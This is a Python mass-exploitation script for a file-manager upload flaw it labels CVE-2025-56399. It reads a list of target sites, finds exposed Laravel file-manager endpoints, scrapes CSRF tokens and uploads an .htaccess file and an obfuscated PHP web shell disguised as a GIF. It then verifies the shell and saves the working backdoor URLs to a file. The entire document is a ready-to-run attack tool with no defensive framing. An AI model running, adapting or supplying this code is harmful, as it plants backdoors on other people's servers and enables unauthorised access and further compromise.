# -*- coding: utf-8 -*-
import requests
import re
import sys
import json
import time
import urllib3
from multiprocessing.dummy import Pool as ThreadPool
from colorama import Fore, Style, init

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
requests.packages.urllib3.disable_warnings()

init(autoreset=True)

RED = Fore.RED + Style.BRIGHT
GREEN = Fore.GREEN + Style.BRIGHT
CYAN = Fore.CYAN + Style.BRIGHT
YELLOW = Fore.YELLOW + Style.BRIGHT

THREADS = 5
TIMEOUT = 10

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
}

def check_filemanager(url):
    session = requests.Session()
    session.verify = False
    try:
        url = url.strip()
        if not url.startswith("http://") and not url.startswith("https://"):
            url = "https://" + url
            
        paths = [
            '/file-manager/tinymce',
            '/file-manager/ckeditor',
            '/file-manager/tinymce5',
            '/file-manager/summernote',
            '/admin/file-manager/tinymce',
        ]
        
        for path in paths:
            target = url.rstrip("/") + path
            try:
                resp = session.get(target, timeout=TIMEOUT, headers=HEADERS)
                
                if resp.status_code == 200:
                    if 'vendor/file-manager/js/file-manager.js' in resp.text:
                        print(GREEN + "[+] File Manager found: " + target)
                        
                        csrf_token = ''
                        csrf_match = re.findall(r'<meta name="csrf-token" content="([^"]+)"', resp.text)
                        if csrf_match:
                            csrf_token = csrf_match[0]
                            print(CYAN + "[+] CSRF Token: " + csrf_token)
                        else:
                            csrf_match = re.findall(r'<input[^>]*name=["\']?_token["\'][^>]*value=["\']([^"\']+)["\']', resp.text)
                            if csrf_match:
                                csrf_token = csrf_match[0]
                                print(CYAN + "[+] CSRF Token (form): " + csrf_token)
                            else:
                                print(RED + "[-] CSRF token not found")
                        
                        if csrf_token:
                            print(CYAN + "[*] Uploading shell...")
                            upload_filemanager(url, csrf_token, session)
                        else:
                            print(RED + "[-] Skip upload, no CSRF token")
                        
                        return True
            except:
                continue
                
        print(RED + "[-] Not found: " + url)
        return False
    except Exception as e:
        print(RED + "[!] Error: " + url + " - " + str(e))
        return False
    finally:
        session.close()

def upload_filemanager(url, csrf_token, session):
    try:
        headers_ajax = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.9',
            'X-Requested-With': 'XMLHttpRequest',
            'X-CSRF-TOKEN': csrf_token,
            'Referer': url,
            'Connection': 'keep-alive'
        }
        
        url_init = url + "/file-manager/initialize"
        print(YELLOW + "[*] Getting config from: " + url_init)
        resp_init = session.get(url_init, headers=headers_ajax)
        
        if resp_init.status_code != 200:
            print(RED + "[-] Failed to initialize file manager")
            return False
            
        data = json.loads(resp_init.text)
        if 'config' in data and 'disks' in data['config']:
            uploads_key = list(data['config']['disks'].keys())[0]
            print(GREEN + "[+] Disk key: " + uploads_key)
            
            url_upload = url + "/file-manager/upload"
            data_upload = {
                'disk': uploads_key,
                'path': '',
                'overwrite': '0'
            }
            
            print(YELLOW + "[*] Uploading .htaccess...")
            htaccess_content = "<IfModule mod_rewrite.c>RewriteEngine OnRewriteBase /RewriteRule ^index\\.php$ - [L]RewriteCond %{REQUEST_FILENAME} !-fRewriteCond %{REQUEST_FILENAME} !-dRewriteRule . /index.php [L]</IfModule>"
            files_ht = [('files[]', ('.htaccess', htaccess_content, 'application/octet-stream'))]
            resp_ht = session.post(url_upload, data=data_upload, files=files_ht, headers=headers_ajax)
            if resp_ht.status_code == 200:
                print(GREEN + "[+] .htaccess uploaded successfully.")
            else:
                print(YELLOW + "[-] .htaccess upload failed, continue to shell.")
            
            php_content = """<?php if(isset($_GET['shinday'])||$_SERVER['REQUEST_METHOD']==='POST'){$uname='p'.'h'.'p'.'_'.'u'.'n'.'a'.'m'.'e';$move='m'.'o'.'v'.'e'.'_'.'u'.'p'.'l'.'o'.'a'.'d'.'e'.'d'.'_'.'f'.'i'.'l'.'e';$copy='c'.'o'.'p'.'y';echo'<center><pre><br><br><b style="color:blue;">Shinday</b> - '.$uname()."\n".'<br><br><br><form method="post" enctype="multipart/form-data"><input type="file" name="__"><input name="_" type="submit" value="Upload"></form>';if($_SERVER['REQUEST_METHOD']==='POST'){$tmp=$_FILES['__']['tmp_name']??'';$name=$_FILES['__']['name']??'';if($tmp&&$name){if(@$move($tmp,$name)){echo'<b style="color:green;">Upload success</b><br><br><a href="'.$name.'" target="_blank">Click here</a>';}elseif(@$copy($tmp,$name)){echo'<b style="color:green;">Upload success (copy)</b><br><br><a href="'.$name.'" target="_blank">Click here</a>';}else{echo'<b style="color:red;">Upload failed</b>';}}}}else{header('Content-Type: image/gif');echo"\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00\x21\xF9\x04\x01\x00\x00\x00\x00\x2C\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3B";exit;}?>"""
            
            filename = "shxt_" + str(int(time.time())) + ".php"
            files = [('files[]', (filename, php_content, 'image/gif'))]
            
            print(YELLOW + "[*] Uploading shell: " + filename)
            resp_upload = session.post(url_upload, data=data_upload, files=files, headers=headers_ajax)
            
            if resp_upload.status_code == 200:
                print(GREEN + "[+] Shell uploaded successfully")
                
                url_file = url + "/file-manager/url?disk=" + uploads_key + "&path=" + filename
                resp_url = session.get(url_file, headers=headers_ajax)
                
                try:
                    url_json = resp_url.json()
                    if 'url' in url_json:
                        current_url = url_json['url']
                        if not current_url.startswith('http'):
                            current_url = url.rstrip('/') + '/' + current_url.lstrip('/')
                        print(GREEN + "[+] Shell URL: " + current_url +"?shinday=1")
                        
                        try:
                            cek = session.get(current_url+"?shinday=1", timeout=10)
                            if 'Shinday' in cek.text:
                                print(GREEN + "[+] Shell VALID!")
                                with open("valid.txt", "a") as f:
                                    f.write(current_url+"?shinday=1\n")
                                return True
                            else:
                                print(YELLOW + "[-] Shell not valid")
                                return False
                        except:
                            print(YELLOW + "[-] Shell not valid (unreachable)")
                            return False
                except:
                    print(RED + "[-] Failed to get URL")
                    return False
            else:
                print(RED + "[-] Shell upload failed: " + resp_upload.text[:100])
                return False
    except Exception as e:
        print(RED + "[!] Upload error: " + str(e))
        return False

def main():
    print(CYAN + "="*50)
    print(CYAN + "   File Manager Checker | CVE-2025-56399")
    print(CYAN + "="*50 + "\n")
    
    if len(sys.argv) < 2:
        print(RED + "Usage: python2 lfm.py list.txt")
        sys.exit(1)
    
    try:
        with open(sys.argv[1], 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
    except:
        print(RED + "[!] Failed to read file!")
        sys.exit(1)
    
    pool = ThreadPool(THREADS)
    pool.map(check_filemanager, urls)
    pool.close()
    pool.join()
    
    print(GREEN + "\n[*] Done! Results saved to valid.txt")

if __name__ == "__main__":
    main()
